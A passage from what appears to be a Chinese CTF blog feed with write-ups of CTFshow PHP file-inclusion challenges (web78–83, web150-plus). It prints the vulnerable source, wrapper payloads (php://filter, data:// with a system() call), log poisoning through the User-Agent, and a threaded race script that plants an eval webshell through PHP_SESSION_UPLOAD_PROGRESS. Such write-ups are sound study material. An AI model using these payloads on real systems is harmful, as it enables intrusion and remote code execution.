punctuation">:</span> <span class="token string">"/tmp/sess_test"</span><span class="token punctuation">,</span>    <span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">'system("cat flag.php");'</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://7445f895-6f17-4435-adc0-62055d7f0cb7.chall.ctf.show/'</span><span class="token punctuation">,</span>                            data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php eval($_POST["cmd"]);?>'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                            files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            <span class="token string">'http://7445f895-6f17-4435-adc0-62055d7f0cb7.chall.ctf.show/?isVIP=1'</span><span class="token punctuation">,</span>            data<span class="token operator">=</span>data        <span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag{'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*]retrying...'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150-plus"></a>web150-plus</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">CTFSHOW</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant">TRUE</span><span class="token punctuation">:</span><span class="token constant">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token shell-comment comment">#过滤字符</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>session文件包含可以继续打！</p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之web(二)</title>
      <link href="/2021/07/02/ctfshow-zhi-web-er/"/>
      <url>/2021/07/02/ctfshow-zhi-web-er/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web78-79"><a href="#web78-79" class="headerlink" title="web78-79"></a>web78-79</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="伪协议："><a href="#伪协议：" class="headerlink" title="伪协议："></a>伪协议：</h3><pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</code></pre><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处利用的是日志文件被包含，然后通过ua头来写入命令执行函数</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">GET</span> <span class="token operator">/</span><span class="token operator">?</span>file<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> 33343a7c<span class="token operator">-</span>bfff<span class="token number">-4698</span><span class="token operator">-</span>bb14<span class="token operator">-</span>da66ae32aab7<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token punctuation">:</span><span class="token number">8080</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> <span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里我go失败了</p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B407%E6%9C%8803%E6%97%A51308_1.png" alt></p><p>利用web80的方法成功实现命令执行，并读取到flag</p><h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>点被ban了所以上面的方法不能使用了</p><p>这个题目要利用php_SESSION_UPLOAD_PROGRESS</p><ul><li><p>这里给学习资料<a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">session.upload_progress进行文件包含</a></p></li><li><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html" target="_blank" rel="noopener">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含 - NPFS - 博客园 (cnblogs.com)</a></p></li></ul><h3 id="阻碍条件一"><a href="#阻碍条件一" class="headerlink" title="阻碍条件一"></a>阻碍条件一</h3><p>session.auto_start=On(也就是等于利用session_start();来初始化一个会话)，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p><h3 id="有利条件一"><a href="#有利条件一" class="headerlink" title="有利条件一"></a>有利条件一</h3><p>但是还有一个默认选项session.use_strict_mode的值为off(默认值)，如果开启他会限制用户的sessid，使其非用户可控，这样做的目的就是在cookie中设置phpsessid的时候保证我们的值可控来实现达到攻击的效果，这样我们如果传入COOKIE:PHPSESSID=flag，加上我们传入的post数据，就会生成/tmp/sess_flag文件，<strong>即使用户没有初始化一个会话，php也会自动初始化一个session</strong>，并且同时会产生一个健值，这个健值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_name文件里。</p><h3 id="阻碍条件二"><a href="#阻碍条件二" class="headerlink" title="阻碍条件二"></a>阻碍条件二</h3><p>默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，<strong>一旦读取了所有POST数据，它就会清除进度信息</strong></p><p>解决方案：利用条件竞争来实现</p><p>首先构造post数据包：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://988f4820-c15d-47e3-ae23-353645cab577.challenge.ctf.show:8080/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B407%E6%9C%8803%E6%97%A51747_1.png" alt></p><p>线程开的大一点基本在20左右然后就会爆出来</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B407%E6%9C%8803%E6%97%A51759_2.png" alt></p><p>理一下思路：</p><p><a href="https://www.cnblogs.com/cqingt/p/6676248.html" target="_blank" rel="noopener">PHP利用Session实现上传进度</a></p><p>因为当session.upload_progress.enabled在ini选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p><p> 而在ini文件当中是这个样子的</p><pre class="line-numbers language-php"><code class="language-php">session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>enabled <span class="token operator">=</span> <span class="token string">"1"</span>session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>cleanup <span class="token operator">=</span> <span class="token string">"1"</span>session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>prefix <span class="token operator">=</span> <span class="token string">"upload_progress_"</span>session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span>session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>freq <span class="token operator">=</span> <span class="token string">"1%"</span>session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>min_freq <span class="token operator">=</span> <span class="token string">"1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先利用post传包，并且利用php_session.upload_progress来做到将自己定义的名字为phpsessid中的值的文件成功传入攻击对象服务器中，又因为clean方法的存在，所以需要一边包含此文件，一边传入此文件来触发文件包含漏洞，达到命令执行的效果</p><p><strong>session文件默认存储路径</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比上一道题多了两个函数：</p><p><strong>session_unset()</strong> 会释放当前会话注册的所有会话变量。 </p><p><strong>session_destroy()</strong> 销毁当前会话中的全部数据，   但是不会重置当前会话所关联的全局变量，   也不会重置会话 cookie。   如果需要再次使用会话变量，   必须重新调用 <strong>session_start()</strong>函数。   </p><p>   